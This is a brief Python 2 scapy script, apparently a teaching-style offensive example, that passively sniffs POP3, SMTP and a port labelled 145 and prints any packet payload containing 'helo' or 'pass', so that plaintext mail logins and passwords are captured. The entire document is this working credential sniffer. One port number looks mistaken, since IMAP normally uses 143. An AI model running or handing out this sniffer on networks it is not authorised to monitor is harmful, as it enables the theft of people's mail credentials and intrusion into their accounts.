from scapy.all import *

#our packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
            
        if "helo" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

#Filter all the packets on tcp port 145, 110 and 25 and don't keep packets in memory
sniff(filter="tcp port 110 or tcp port 25 or tcp port 145", prn=packet_callback, count=1, store=0)
